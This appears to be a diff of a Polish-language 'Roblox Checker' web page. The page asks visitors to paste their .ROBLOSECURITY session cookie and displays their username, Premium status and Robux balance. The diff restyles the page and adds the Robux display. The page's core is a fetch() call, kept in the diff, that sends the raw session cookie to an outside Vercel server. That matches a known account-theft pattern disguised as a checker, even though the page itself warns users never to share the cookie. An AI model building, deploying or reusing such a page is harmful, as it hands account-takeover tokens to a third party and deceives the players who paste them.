@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Roblox – nazwa + Premium z .ROBLOSECURITY</title>
+  <title>Roblox Checker – nazwa, Premium, Robux</title>
   <style>
     body { 
       font-family: Arial, sans-serif; 
@@ -12,54 +12,55 @@
       padding: 20px; 
       background: #111; 
       color: #eee; 
+      line-height: 1.5;
     }
+    h2 { color: #1e90ff; }
     textarea { 
       width: 100%; 
-      height: 140px; 
+      height: 160px; 
       background: #222; 
       color: #eee; 
       border: 1px solid #444; 
       padding: 12px; 
       font-family: monospace; 
-      resize: vertical;
+      resize: vertical; 
+      border-radius: 4px;
     }
     button { 
-      padding: 14px 32px; 
+      padding: 14px 40px; 
       background: #1e90ff; 
       border: none; 
       color: white; 
-      font-size: 17px; 
+      font-size: 18px; 
       cursor: pointer; 
-      margin: 15px 0; 
-      border-radius: 4px;
+      margin: 20px 0; 
+      border-radius: 6px;
     }
-    button:hover { 
-      background: #0c7ae6; 
-    }
+    button:hover { background: #0c7ae6; }
     #result { 
       margin-top: 25px; 
-      padding: 20px; 
+      padding: 25px; 
       background: #1a1a1a; 
       border: 1px solid #444; 
-      border-radius: 8px; 
-      min-height: 100px; 
-      line-height: 1.5;
+      border-radius: 10px; 
+      min-height: 140px;
     }
-    .error { color: #ff4d4d; }
-    .success { color: #00ff9d; }
+    .error { color: #ff4d4d; font-weight: bold; }
+    .success { color: #00ff9d; font-weight: bold; }
+    .info { color: #ddd; }
+    strong { color: #ffcc00; }
   </style>
 </head>
 <body>
-<h2>Pobierz nazwę i Premium z cookie Roblox</h2>
+<h2>Roblox – sprawdź dane konta z .ROBLOSECURITY</h2>
 
-<p style="color:#ffcc00; font-weight:bold;">
-  <strong>OSTRZEŻENIE:</strong> .ROBLOSECURITY to klucz do konta – NIGDY nie wysyłaj go nikomu!
+<p style="color:#ffcc00; font-weight:bold; font-size:1.1em;">
+  ⚠️ UWAGA: .ROBLOSECURITY to TWÓJ KLUCZ DO KONTA – NIGDY NIKOMU GO NIE DAWAJ!
 </p>
 
-<textarea id="cookie" placeholder="Wklej tutaj sam ciąg .ROBLOSECURITY (bez '.ROBLOSECURITY=')"></textarea>
+<textarea id="cookie" placeholder="Wklej tutaj sam ciąg .ROBLOSECURITY (bez '.ROBLOSECURITY=')..."></textarea>
 
-<br>
-<button onclick="sprawdz()">Sprawdź</button>
+<button onclick="sprawdz()">Sprawdź konto</button>
 
 <div id="result"></div>
 
@@ -70,14 +71,14 @@ async function sprawdz() {
   result.innerHTML = '';
 
   if (cookieVal.length < 200) {
-    result.innerHTML = '<span class="error">Wklej poprawne cookie! (zbyt krótkie)</span>';
+    result.innerHTML = '<span class="error">Cookie za krótkie – wklej poprawne .ROBLOSECURITY!</span>';
     return;
   }
 
-  result.innerHTML = '<i>Proszę czekać...</i>';
+  result.innerHTML = '<span class="info">Trwa sprawdzanie... proszę czekać</span>';
 
   try {
-    const resp = await fetch('https://checker-alpha-pink.vercel.app/api/get-username', {
+    const resp = await fetch('https://checker-alpha-pink.vercel.app/api/get-username', {  // ← zmień na swój URL jeśli hostujesz gdzie indziej
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ cookie: cookieVal })
@@ -89,13 +90,14 @@ async function sprawdz() {
       result.innerHTML = `<span class="error">Błąd: ${json.error}</span>`;
     } else if (json.success) {
       result.innerHTML = `
-        <span class="success">Zalogowano pomyślnie!</span><br><br>
+        <span class="success">✓ Połączono pomyślnie!</span><br><br>
         <b>Nazwa użytkownika:</b> ${json.username}<br>
         <b>Display Name:</b> ${json.displayName}<br>
         <b>User ID:</b> ${json.userId}<br>
         <b>Roblox Premium:</b> ${json.hasPremium 
-          ? '<span style="color:#00ff9d; font-weight:bold;">TAK ✅</span>' 
-          : '<span style="color:#ff4d4d; font-weight:bold;">NIE ❌</span>'}
+          ? '<span style="color:#00ff9d;">TAK ✅</span>' 
+          : '<span style="color:#ff4d4d;">NIE ❌</span>'}<br>
+        <b>Robux na koncie:</b> <span style="color:#ffcc00; font-size:1.2em;">${json.robux.toLocaleString('pl-PL')}</span> ₪
       `;
     } else {
       result.innerHTML = '<span class="error">Nieznana odpowiedź serwera</span>';
